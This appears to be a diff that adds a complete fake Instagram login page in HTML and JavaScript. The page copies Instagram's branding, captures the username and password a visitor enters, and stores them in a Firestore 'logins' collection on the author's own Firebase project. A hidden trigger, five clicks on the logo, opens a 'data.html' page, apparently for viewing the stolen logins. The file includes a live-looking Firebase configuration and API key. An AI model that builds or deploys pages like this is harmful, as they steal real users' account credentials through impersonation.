@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram Login</title>
+  <style>
+    body {
+      font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      max-width: 935px;
+      width: 100%;
+      padding: 0 20px;
+      margin: auto;
+    }
+    .login-form {
+      width: 350px;
+      margin: 0 auto;
+      text-align: center;
+      padding: 30px 0;
+    }
+    .logo {
+      font-size: 30px;
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+    }
+    button {
+      width: 100%;
+      padding: 8px;
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-form">
+      <div class="logo" id="instagramLogo">Instagram</div>
+      <form id="loginForm">
+        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log in</button>
+      </form>
+    </div>
+  </div>
+
+  <script type="module">
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyAVeEjtLg68DEK-dNtAHN5JFOy1NaevVjA",
+      authDomain: "my-project-1-7e614.firebaseapp.com",
+      projectId: "my-project-1-7e614",
+      storageBucket: "my-project-1-7e614.firebasestorage.app",
+      messagingSenderId: "807664093949",
+      appId: "1:807664093949:web:98b8505fa2277371938c94",
+      measurementId: "G-8DFGXF1QWX"
+    };
+
+    // Initialize Firebase
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js';
+    import { getFirestore, addDoc, collection } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js';
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    let clickCount = 0;
+    document.getElementById('instagramLogo').addEventListener('click', () => {
+      clickCount++;
+      if (clickCount >= 5) {
+        window.open('data.html', '_blank');
+        clickCount = 0; // Reset counter
+      }
+    });
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      try {
+        await addDoc(collection(db, "logins"), { username, password });
+        alert("Data sent successfully!");
+      } catch (error) {
+        console.error("Error:", error);
+      }
+    });
+  </script>
+</body>
+</html>
